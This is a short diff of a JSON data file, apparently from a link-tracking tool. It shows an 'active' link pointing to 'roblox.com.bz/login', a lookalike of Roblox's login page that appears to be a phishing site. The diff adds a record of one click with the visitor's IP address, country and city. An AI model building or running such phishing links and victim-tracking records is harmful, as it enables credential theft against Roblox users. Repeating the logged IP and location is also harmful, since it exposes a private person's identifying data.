@@ -14161,8 +14161,17 @@
     "targetUrl": "https://roblox.com.bz/login?returnUrl=2671794013209664",
     "createdAt": 1778688484557,
     "status": "active",
-    "useCount": 0,
+    "useCount": 1,
     "createdBy": "admin",
-    "clicks": []
+    "clicks": [
+      {
+        "timestamp": 1778688496679,
+        "ip": "110.54.154.250",
+        "country": "Philippines",
+        "city": "Tarlac City",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
+      }
+    ]
   }
 ]
